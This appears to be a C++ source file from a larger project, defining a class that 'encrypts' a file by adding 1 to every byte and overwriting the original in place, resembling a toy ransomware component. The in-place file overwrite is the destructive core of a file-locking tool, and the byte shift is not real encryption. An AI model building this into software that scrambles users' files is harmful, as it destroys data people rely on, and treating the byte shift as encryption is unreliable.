#include "sys-check.cpp"
#include <cstring>
#include <dirent.h>
#include <fstream>
#include <ios>
#include <iostream>
#include <string>
#include <sys/stat.h>

class SingleFileEncryptor {
private:
  PlatformGreeting platform;
  std::string tempFilePath = "temp.txt";

  void encryptSingleFile(std::string filePath) {
    std::fstream file, tempFile;

    // Open file streams
    file.open(filePath, std::ios::in);
    tempFile.open(tempFilePath, std::ios::out);

    // Read byte by byte through file
    char byte;
    while (file >> std::noskipws >> byte) {
      // Encrypt the byte by adding 1 to it
      byte += 1;
      // Save this byte into tempFilePath
      tempFile << byte;
    }

    // Close file streams
    file.close();
    tempFile.flush(); // Flush the content to disk
    tempFile.close();

    // Open file streams
    file.open(
        filePath,
        std::ios::out); // Change mode to out to overwrite the original file
    tempFile.open(tempFilePath, std::ios::in);

    // Read through temp file byte by byte
    while (tempFile >> std::noskipws >> byte) {
      // Save this byte into filePath
      file << byte;
    }

    // Close file streams
    file.close();
    tempFile.close();

    // Delete temp file
    remove(tempFilePath.c_str());
  }

public:
  void encrypt(std::string filePath) { encryptSingleFile(filePath); }
};
